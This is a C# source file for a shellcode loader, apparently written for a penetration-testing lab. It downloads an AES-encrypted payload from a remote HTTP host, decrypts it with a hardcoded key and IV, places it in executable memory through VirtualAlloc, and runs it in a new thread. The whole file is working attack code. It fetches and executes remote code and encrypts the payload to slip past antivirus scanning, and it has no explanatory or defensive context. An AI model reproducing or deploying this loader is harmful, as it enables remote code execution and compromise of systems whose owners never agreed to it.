using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

class Program
{
    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    static void Main()
    {
        string url = "http://10.10.14.149:8000/shell.enc"; 

        // 1. Download shellcode
        byte[] shellcode = new WebClient().DownloadData(url);

        Aes aes = Aes.Create();
        byte[] key = new byte[16] { 0x1e, 0x71, 0x5b, 0xdf, 0x7a, 0x5f, 0x02, 0x1b, 0x25, 0x1d, 0x5b, 0xa7, 0xe1, 0xd1, 0xca, 0x97 };
        byte[] iv = new byte[16] { 0xae, 0x5d, 0xc3, 0x13, 0x6f, 0xc3, 0xf5, 0x87, 0xda, 0xee, 0xc5, 0xca, 0x82, 0x3f, 0xd5, 0xe2 };
        ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
        byte[] buf;
        using (var msDecrypt = new System.IO.MemoryStream(shellcode))
        {
            using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
            {
                using (var msPlain = new System.IO.MemoryStream())
                {
                    csDecrypt.CopyTo(msPlain);
                    buf = msPlain.ToArray();
                }
            }
        }
        Console.WriteLine($"[+] Downloaded {buf.Length} bytes");

        // 2. Allocate memory
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);

        // 3. Copy shellcode
        Marshal.Copy(buf, 0, addr, buf.Length);

        // 4. Execute
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
